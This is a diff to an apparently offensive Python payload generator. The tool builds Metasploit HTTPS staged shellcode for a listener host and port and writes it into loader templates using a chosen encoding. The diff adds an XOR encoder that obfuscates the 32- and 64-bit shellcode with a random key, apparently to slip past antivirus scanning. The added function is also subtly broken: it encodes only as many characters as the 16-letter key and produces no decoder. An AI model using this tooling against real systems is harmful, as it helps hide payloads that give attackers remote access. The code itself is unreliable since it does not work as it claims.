@@ -4,6 +4,10 @@ import argparse
 import os
 import glob
 import random
+import string
+import json
+import base64
+
 
 def cheers():
     print()
@@ -99,6 +103,31 @@ def rot_encoding(content_32, content_64):
 
     return enc_content_32, enc_content_64, dec_routine
 
+def xor_encoding(content_32, content_64):
+    # thanks https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_xor_process.htm
+    try:
+        letters = string.ascii_lowercase
+        key = ''.join(random.choice(letters) for i in range(16))
+        print("[+] Encoding shellcode with XOR key: %s"%(key))
+
+        enc_content_32 = "".join([chr(ord(c1)^ord(c2)) for (c1,c2) in zip(content_32,key)])
+        print("XOR'ed content32: ")
+        print(enc_content_32)
+
+        enc_content_64 = "".join([chr(ord(c1)^ord(c2)) for (c1,c2) in zip(content_64,key)])
+        print("XOR'ed content64: ")
+        print(enc_content_64)
+
+        plain_32 = "".join([chr(ord(c1)^ord(c2)) for (c1,c2) in zip(enc_content_32,key)])
+        print("UNXOR'ed content32: ")
+        print(plain_32)
+
+
+    except Exception as e:
+        print(str(e))
+        quit()
+
+
 def msf_gen(l:str, p:int):
     print("[+] Generating x86 and x64 MSF HTTPS staged payloads, for %s:%d"%(l,p))
 
@@ -166,6 +195,10 @@ if __name__=="__main__":
         #Open all files in "templates" folder, and swap the content with the payloads
         template_filling(shell_mark, dec_mark, dec_routine, content_32, 32)
         template_filling(shell_mark, dec_mark, dec_routine, content_64, 64)
+    elif str(e).upper() == "XOR":
+        # Encoding with XOR
+        xor_encoding(content_32, content_64)
+        quit()
     else:
         print("[-] Did you set a supported encoding method?")
         quit()
